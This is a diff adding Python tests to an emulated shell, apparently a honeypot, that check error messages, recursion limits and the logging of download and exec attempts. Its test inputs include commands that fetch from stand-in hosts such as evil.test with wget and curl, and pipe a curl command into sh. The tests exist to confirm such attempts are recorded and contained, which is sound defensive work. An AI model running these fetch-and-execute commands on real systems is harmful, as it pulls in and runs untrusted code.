@@ -93,3 +93,22 @@ def test_robustness():
     assert run(sh, "grep '(a+)+$' /etc/passwd")[0] == ""      # ReDoS guard, returns fast
     sh.run("exit")
     assert sh.exited
+
+def test_exec_paths_and_scripts():
+    sh, ev = mk()
+    assert run(sh, "./nope")[0] == "bash: ./nope: No such file or directory\n"
+    assert run(sh, "sh nope.sh")[0] == "sh: nope.sh: No such file or directory\n"
+    assert run(sh, "/tmp")[0] == "bash: /tmp: Is a directory\n"
+    run(sh, "echo 'wget http://evil.test/p' > /tmp/s.sh")
+    assert run(sh, "/tmp/s.sh")[0] == "bash: /tmp/s.sh: Permission denied\n"
+    run(sh, "chmod +x /tmp/s.sh", "/tmp/s.sh", "sh /tmp/s.sh", "bash -c 'curl evil2.test'", "echo 'curl x.test' | sh")
+    urls = [f["url"] for t, f in ev if t == "download_attempt"]
+    assert urls == ["http://evil.test/p", "http://evil.test/p", "evil2.test", "x.test"]
+    assert [f["path"] for t, f in ev if t == "exec_attempt"] == ["/tmp/s.sh"]
+
+def test_script_recursion_and_exit_are_contained():
+    sh, _ = mk()
+    run(sh, "echo './r' > /tmp/r", "chmod +x /tmp/r")
+    assert run(sh, "/tmp/r; echo done")[0].endswith("done\n")       # depth limit, no hang
+    run(sh, "echo 'exit' > /tmp/e", "sh /tmp/e")
+    assert not sh.exited                                             # exit in a script != session exit
